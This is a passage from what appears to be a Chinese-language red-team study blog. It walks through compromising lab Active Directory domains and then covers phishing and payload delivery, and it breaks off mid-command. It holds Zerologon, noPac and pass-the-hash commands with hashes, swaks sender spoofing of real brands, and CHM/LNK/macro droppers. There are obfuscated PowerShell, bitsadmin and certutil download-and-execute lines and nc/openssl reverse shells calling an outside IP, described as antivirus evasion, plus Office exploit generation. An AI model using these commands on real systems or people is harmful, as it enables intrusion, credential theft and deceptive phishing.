）靶机 6<br>\nCVE-2017-0146 不存在、CVE-2014-6324 太老、CVE-2021-42287 、CVE- 2022-26923 条件不满足。CVE-2020-1472 满足。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接DC清空凭证</span></span><br><span class=\"line\">proxychains python cve-2020-1472-exploit.py dc 192.168.10.10</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取域内HASH</span></span><br><span class=\"line\">cd impacket-0.9.23/examples/</span><br><span class=\"line\">proxychains python secretsdump.py dc\\$@192.168.10.10 -just-dc -no-pass</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接域控PTH</span></span><br><span class=\"line\">proxychains python wmiexec.py -hashes :a402bea39d0f49b50ea1941120780ee3 xdorg/administrator@192.168.10.10</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上传后门至域内主机上&amp;CS横向移动</span></span><br><span class=\"line\">copy \\\\web\\c$\\6677.exe</span><br><span class=\"line\">6677.exe</span><br><span class=\"line\">connect 192.168.10.10 6677</span><br></pre></td></tr></table></figure>\n<h4 id=\"vpc4\"><a class=\"markdownIt-Anchor\" href=\"#vpc4\">#</a> vpc4</h4>\n<p><img data-src=\"/N1h1l157/Safe/image-006.png\" alt></p>\n<p>（ 1 ）靶机 1 ：WEB<br>\ntomcat 弱口令上传制作的 war 连接哥斯拉、上传 cs 后门执行上线，getsystem 进入域、探针内网 IP 段，定位域控，信息打点服务。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">提高权限</span></span><br><span class=\"line\">getsystem</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取前缀</span></span><br><span class=\"line\">net view /domain</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">定位域控</span></span><br><span class=\"line\">net time /domain</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">netbios前缀 jishu</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">域控 jishudc.jishu.xiaodi.vpc 192.168.2.20</span></span><br></pre></td></tr></table></figure>\n<p>（ 2 ）靶机 2 ：SQL<br>\n 口令喷射失败<br>\n spn 扫描服务<br>\n数据库配置文件翻阅，弱口令爆破（MSSQL）<br>\nMDUT 代理转发 正向上线 主动连接上线</p>\n<p>（ 3 ）靶机 3 ：jishudc<br>\npsexec CrackMapExec 口令喷射成功，横向拿下</p>\n<p>（ 4 ）靶机 4 ：xds<br>\n 利用域管口令横向拿下<br>\n获取前缀：net view /domain<br>\n 获取到其他子域 xiaoshou<br>\nxiaoshou.xiaodi.vpc</p>\n<p>（ 5 ）靶机 5 ：xsd<br>\n 口令喷射不成功，有防火墙<br>\n 80 端口拿下 - 通达 OA 漏洞利用 - Getshell<br>\n 上传正向木马执行并主动连击<br>\n获取域控 netbios 及域控 ip 地址</p>\n<p>（ 6 ）靶机 6 ：xiaoshoudc<br>\nhash 匹配不上，采用漏洞提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">14、17 年的漏洞太老不选择，21、22 需要 一个域内的明文账户密码，前提条件不满足，选择 20 年的漏洞。</span></span><br><span class=\"line\">proxychains python cve- 2020 - 1472 - exploit.py xiaoshoudc 192.168.3.20 shell noPac.exe -domain xiaoshou.xiaodi.vpc -user xiaosedi -pass xsd!@#45 /dc xiaoshoudc.xiaoshou.xiaodi.vpc /mAccount test /mPassword 12qwAS.. /service cifs /ptt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用<span class=\"built_in\">hash</span>及psexec进行利用拿权限：flag.txt口令传递拿下、</span></span><br><span class=\"line\">shell copy hack.php \\\\xiaoshoudc\\c$\\phpstudy_pro\\www\\hack.php</span><br></pre></td></tr></table></figure>\n<p>（ 7 ）靶场 7 ：file 也可以采用 Nopac 提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">横向口令拿下</span></span><br><span class=\"line\">proxychains python cme smb 192.168.4.11 -u administrator -H f1065013e55bbbeb64ddab768229710d --local-auth</span><br></pre></td></tr></table></figure>\n<p>（ 8 ）靶场 8 ：fileadmin<br>\n 资源约束委派</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取受害目标：有哪些域内计算机存在同一用户加入的</span></span><br><span class=\"line\">shell AdFind.exe -h 192.168.4.20 -b &quot;DC=xiaodi,DC=vpc&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">判断受害用户：</span></span><br><span class=\"line\">shell sid2user.exe \\\\192.168.4.20 5 21 3673262946 1983004332 2925526849 1103</span><br><span class=\"line\">shell SharpAllowedToAct.exe -m xxxyyxxx -p xxyyx!@#45 -t file -a 192.168.4.20 xiaodi.vpc</span><br><span class=\"line\">python getST.py -dc-ip 192.168.4.20 xdvpc/fileadmin$:file!@#45 -spn cifs/fileadmin.xiaoshou.xiaodi.vpc -impersonate administrator</span><br><span class=\"line\">kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure>\n<p>（ 9 ）靶场 9 ：dc<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZlaWdo\">https://github.com/Kevin-Robertson/Inveigh</span></p>\n<p>监听拦截到 DC 的密文 ：Inveigh.exe<br>\n 获取到的是 NET NTLM HASH V1 或 V2<br>\n 破解得出明文： <code>hashcat.exe -a 3 -m 5600 xxxxxx ?l?l?l?l?l?s?s?s?d?d?d?d</code> <br>\n 通过 Inveigh.exe 获取的明文横向移动获取</p>\n<h3 id=\"红队apt\"><a class=\"markdownIt-Anchor\" href=\"#红队apt\">#</a> 红队 APT</h3>\n<h4 id=\"邮件钓鱼\"><a class=\"markdownIt-Anchor\" href=\"#邮件钓鱼\">#</a> 邮件钓鱼</h4>\n<ul>\n<li>SPF 相关知识</li>\n</ul>\n<p>什么是 SPF: 发件人策略框架（Sender Policy Framework）电子邮件认证机制，中文译为发送方策略框架，主要作用是防止伪造邮件地址。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如何判断SPF</span></span><br><span class=\"line\">dig -t txt qq.com //linux</span><br><span class=\"line\">nslookup -type=txt qq.com //windows</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SPF相关显示</span></span><br><span class=\"line\">&quot;v=spf1 -all&quot; (拒绝所有，表示这个域名不会发出邮件)</span><br><span class=\"line\">&quot;v=spf1 +all&quot; (接受所有)</span><br><span class=\"line\">&quot;v=spf1 ip4:192.168.0.1/16 -all&quot;(只允许 192.168.0.1/16 范围内的 IP 发送邮件)</span><br><span class=\"line\">&quot;v=spf1 mx -all&quot;(允许当前域名的 mx 记录对应的 IP 地址发送邮件) &quot;v=spf1 mx mx:test.example.com -all&quot;(允许当前域名和 test.example.com的 mx 记录对应的 IP 地址发送邮件)</span><br><span class=\"line\">&quot;v=spf1 a mx ip4:173.194.72.103 -all&quot;(允许当前域名的 a 记录和 mx 记录和一个给定的 IP 地址发送邮件)</span><br><span class=\"line\">&quot;v=spf1 include:example.com -all&quot;(采用和 example.com 一样的 SPF 记录)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Swaks 简单使用说明</span></span><br><span class=\"line\">-t –to 目标地址 -t test@test.com</span><br><span class=\"line\">-f –from 来源地址 (发件人) -f &quot;text&lt;text@text.com&gt;&quot;</span><br><span class=\"line\">–protocol 设定协议(未测试)</span><br><span class=\"line\">--body &quot;http://www.baidu.com&quot; //引号中的内容即为邮件正文; --header &quot;Subject:hello&quot; //邮件头信息，subject为邮件标题 -ehlo 伪造邮件 ehlo 头</span><br><span class=\"line\">--data ./Desktop/email.txt //将TXT文件作为邮件发送;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>gophish 安装使用</li>\n</ul>\n<p>工具地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdldGdvcGhpc2guY29tLw==\">https://docs.getgophish.com/</span><br>\n 项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvcGhpc2gvZ29waGlzaA==\">https://github.com/gophish/gophish</span></p>\n<p>（ 1 ）无 SPF 直接伪造 - Swaks</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">临时邮箱:</span> </span><br><span class=\"line\">http://24mail.chacuo.net/ https://www.linshi-email.com/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检测:</span></span><br><span class=\"line\">nslookup -type=txt xxx.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">伪造：</span></span><br><span class=\"line\">swaks --header-X-Mailer &quot;&quot; --header-Message-Id &quot;&quot; --header-&quot;Content-Type&quot;=&quot;text/html&quot; --from &quot;QQ管理&lt;admin@qq.com&gt;&quot; --ehlo shabimeiguo -head</span><br><span class=\"line\">er &quot;Subject: 测试&quot; --body 我们做了一个测试 --to owazmoffth@iubridge.com</span><br></pre></td></tr></table></figure>\n<p>（ 2 ）有 SPF 直接伪造 - Swaks<br>\n 工具地址：<span class=\"exturl\" data-url=\"aHR0cDovL2pldG1vcmUub3JnL2pvaG4vY29kZS9zd2Frcy8=\">http://jetmore.org/john/code/swaks/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">软刚发信人：（修改字眼）</span></span><br><span class=\"line\">swaks --body &quot;test&quot; --header &quot;Subject:testT&quot; -t xx@163.com -f system@notice.aliyun.com.cn</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">硬刚发信人：（转发突破）注册一个邮箱开启POP3转发、使用网上已知的邮箱系统。将要发送的邮件导出EML模版，修改内置的发件人内容时间等。</span></span><br><span class=\"line\">swaks --to 收信人 -f 发信人 --data 1.eml --server smtp.163.com -p 25 -au 帐号 -ap 授权码</span><br></pre></td></tr></table></figure>\n<p>自建要伪造高仿的邮箱系统、使用第三方平台或自行搭建、设置 SPF，中转平台突破。<br>\nsmtp2go（速度慢但免费发送量大）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc210cDJnby5jb20v\">https://www.smtp2go.com/</span><br>\nSendCloud（速度快但免费发送量少）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VuZGNsb3VkLm5ldC8=\">https://www.sendcloud.net/</span><br>\n 也可以自己搭建邮件服务器 - Ewomail&amp;Postfix：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ld29tYWlsLmNvbS8=\">http://www.ewomail.com/</span></p>\n<p>（ 3 ）采用自己搭建 Ewomail 配合 Swaks<br>\n 转发地址域名由你指定注册、不受限于其他系统的限制和风控<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2RvYy5ld29tYWlsLmNvbS9kb2NzL2V3b21haWwvamlhbmppZQ==\"> http://doc.ewomail.com/docs/ewomail/jianjie</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI4NjY1MzIvYXJ0aWNsZS9kZXRhaWxzLzEyMzMzNTUyOQ==\">https://blog.csdn.net/u012866532/article/details/123335529</span><br>\nswaks --to <span class=\"exturl\" data-url=\"bWFpbHRvOjQ3MTY1NjgxNEBxcS5jb20=\">471656814@qq.com</span> -f <span class=\"exturl\" data-url=\"bWFpbHRvOmFkbWluQGExaXl1bi5jb20=\">admin@a1iyun.com</span> --data test.eml --server <span class=\"exturl\" data-url=\"aHR0cDovL3NtdHAuYTFpeXVuLmNvbQ==\">smtp.a1iyun.com</span> -p 25 -au <span class=\"exturl\" data-url=\"bWFpbHRvOmFkbWluQGExaXl1bi5jb20=\">admin@a1iyun.com</span> -ap xiaodi123</p>\n<ul>\n<li>网页钓鱼</li>\n</ul>\n<p>克隆：手工另存为、Setoolkit、Goblin<br>\n 工具地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3hpZWNhdC9nb2JsaW4=\">https://github.com/xiecat/goblin</span><br>\n 项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RydXN0ZWRzZWMvc29jaWFsLWVuZ2luZWVyLXRvb2xraXQ=\">https://github.com/trustedsec/social-engineer-toolkit</span></p>\n<h4 id=\"宏病毒\"><a class=\"markdownIt-Anchor\" href=\"#宏病毒\">#</a> 宏病毒</h4>\n<p>生成宏病毒：Attacks --&gt; Packages --&gt; MS offices Macro</p>\n<p>操作：Office 格式文档文件钓鱼一般采用宏或对象触发后门；默认 Office 加载宏后一般需要启用内容才可调用执行；所以诱惑伪装很重要。</p>\n<p>伪装：提示需要启用内容才能查看文件内容，并设置限制编辑等</p>\n<p>文件内容模式：docx-doc&amp;docm、xlsx-xls&amp;xlsm、pptx-ppt&amp;pptm</p>\n<p>老版本： 97 - 2003 0ffice 默认是支持宏代码运行</p>\n<p>新版本：启动宏的格式，一般就是在后缀加上 M</p>\n<h4 id=\"chm-电子书\"><a class=\"markdownIt-Anchor\" href=\"#chm-电子书\">#</a> CHM 电子书</h4>\n<p>CS 生成上线：Attacks——&gt;Web Drive by——&gt;Scripted web Delivery</p>\n<p>CHM 伪装：找一个正常的 CHM 电子书，解压后；将 Payload 插入其中某个或整个页面；加载编译，当电子书打开修改页面后上线。</p>\n<p>解压命令：hh -decompile .\\html xx.CHM</p>\n<p>木马执行：使用 bitsadmin 或 Powershell 模式加载木马</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">免杀方案</span></span><br><span class=\"line\">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://47.94.236.117:84/a&#x27;))&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">bitsadmin /transfer 604c http://47.94.236.117:83/a %APPDATA%\\604c.exe&amp;% APPDATA%\\604c.exe&amp;del %APPDATA%\\604c.exe</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;c&quot;&quot;e&quot;&quot;r&quot;&quot;t&quot;&quot;u&quot;&quot;t&quot;&quot;i&quot;&quot;l&quot; -&quot;u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot; -split -f [http://47.94.236.117](http://47.94.236.117)/5.exe c:/5.exe &amp; c:/5.exe</span><br><span class=\"line\"></span><br><span class=\"line\">powershell -NoExit &quot;$c1=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;$c2=&#x27;123(&#x27;&#x27;http://47.94.236.117:84/a&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX ($c1+$c2)&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe bypass.exe &amp;&amp; .\\bypass.exe &quot;$a=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;$b=&#x27;tp://xxx/hr.ps1&#x27;&#x27;));&#x27;;IEX ($a+$b)&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"lnk-快捷方式\"><a class=\"markdownIt-Anchor\" href=\"#lnk-快捷方式\">#</a> LNK 快捷方式</h4>\n<p>生成：Attacks -&gt; Packages -&gt; Html Application</p>\n<p>上传：Attacks——&gt;Web Drive by——&gt;Host file</p>\n<p>执行：C:\\Windows\\System32\\mshta.exe <span class=\"exturl\" data-url=\"aHR0cDovL3h4Lnh4Lnh4Lnh4\">http://xx.xx.xx.xx</span>:xx/x.ext</p>\n<p>伪装：创建快捷方式、生成 HTA 并上传、属性更改目标执行、属性更改图标伪装</p>\n<p>lnk 免杀思路：powershell 混淆、shellcode 混淆、vba 混淆</p>\n<h4 id=\"office-cve漏洞\"><a class=\"markdownIt-Anchor\" href=\"#office-cve漏洞\">#</a> Office CVE 漏洞</h4>\n<ul>\n<li>Microsoft MSDT CVE-2022-30190 代码执行</li>\n</ul>\n<p>工具地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYQ==\">https://github.com/JohnHammond/msdt-follina</span></p>\n<p>该漏洞首次发现在 2022 年 5 月 27 日，由白俄罗斯的一个 IP 地址上传。恶 意文档从 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，通过 ms-ms dt MSProtocol URI 方法来执行恶意 PowerShell 代码。感染过程利用程序 msdt.e xe，该程序用于运行各种疑难解答程序包。</p>\n<p>此工具的恶意文档无需用户交互即可调用它。导致在宏被禁用的情况下， 恶意文档依旧可以使用 ms-msdt URI 执行任意 PowerShell 代码。</p>\n<p>目前已知影响的版本为:office 2021 Lts、office 2019、office 2016、Offic e 2013、Office ProPlus、Office 365</p>\n<p>测试：msdt.exe/id PCWDiagnostic /skip force /param “IT_RebrowseForFile=? I T_LaunchMethod=ContextMenu IT_BrowseForFile=<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>I</mi><mi>n</mi><mi>v</mi><mi>o</mi><mi>k</mi><mi>e</mi><mo>−</mo><mi>E</mi><mi>x</mi><mi>p</mi><mi>r</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">(Invoke-Expression(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span></span></span></span>(Invoke- Expression(’[System.Text.Encoding]’+[char]58+[char]58+‘Unicode.GetString([Syste m.Convert]’+[char]58+[char]58+‘FromBase64String(’+[char]34+‘YwBhAGwAYwA=’ +[char]34+’))’))))i/…/…/…/…/…/…/…/…/…/…/…/…/…/…/Windows/System32/mpsigstub.exe”</p>\n<ul>\n<li>Microsoft MSHTML CVE- 2021 - 40444 远程代码执行</li>\n</ul>\n<p>工具地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xvY2tlZGJ5dGUvQ1ZFLTIwMjEtNDA0NDQ=\">https://github.com/lockedbyte/CVE-2021-40444</span><br>\n 影响版本：office 2003 office 2007 office 2010 office 2013 office 2016</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装依赖</span></span><br><span class=\"line\">apt-get install lcab</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成DLL</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117lport=9999 -f dll &gt; shell.dll</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听上线</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 9999</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成文档</span></span><br><span class=\"line\">cp shell.dll CVE- 2021 - 40444</span><br><span class=\"line\">python3 exploit.py generate shell.dll http://47.94.236.117:10000</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听文档</span></span><br><span class=\"line\">python3 exploit.py host 10000</span><br></pre></td></tr></table></figure>\n<h4 id=\"钓鱼伪装\"><a class=\"markdownIt-Anchor\" href=\"#钓鱼伪装\">#</a> 钓鱼伪装</h4>\n<p>（ 1 ）文件后缀 - 钓鱼伪装 - RLO</p>\n<p>通过修改文件后缀的编码方式，将 exe 后缀文件伪装为 jpg 文件</p>\n<p>（ 2 ）压缩文件 - 自解压 - 释放执行</p>\n<p>Winrar 压缩软件，设置压缩为自启动，双击压缩文件之后即释放木马</p>\n<p>（ 3 ）捆绑文件 - 打包加载 - 释放执行</p>\n<p>通过不同的捆绑释放器进行绑定免杀木马，执行文件后释放木马</p>\n<h4 id=\"nc-流量加密\"><a class=\"markdownIt-Anchor\" href=\"#nc-流量加密\">#</a> NC 流量加密</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">nc 使用</span></span><br><span class=\"line\">nc -lvvp 5566</span><br><span class=\"line\">nc -e /bin/bash 47.94.236.117 5566</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在我们的攻击端生成自签名证书：</span></span><br><span class=\"line\">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在攻击机上监听指定端口，这里我选择 8888 ：</span></span><br><span class=\"line\">openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在受害机上执行shell反弹命令(注意修改ip和端口)：</span></span><br><span class=\"line\">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 47.94.236.117:8888 &gt; /tmp/s;</span><br></pre></td></tr></table></figure>\n<h4 id=\"msf-通讯特征修改\"><a class=\"markdownIt-Anchor\" href=\"#msf-通讯特征修改\">#</a> MSF 通讯特征修改</h4>\n<p>解决 HTTPS-SSL 通讯证书被特征标示问题</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用openssl生成证书</span></span><br><span class=\"line\">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &quot;/C=UK/</span><br><span class=\"line\">ST=xiaodi/L=xiaodi/O=Development/CN=www.baidu.com&quot; -keyout www.baidu.co m.key -out www.baidu.com.crt &amp;&amp; cat www.baidu.com.key www.baidu.com.crt &gt;</span><br><span class=\"line\">www.baidu.com.pem &amp;&amp; rm -f www.baidu.com.key www.baidu.com.crt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF生成绑定证书后门</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_https LHOST=47.94.236.117 LPO</span><br><span class=\"line\">RT=5566 PayloadUUIDTracking=true PayloadUUIDName=Whoamishell HandlerS SLCert=/root/www.baidu.com.pem 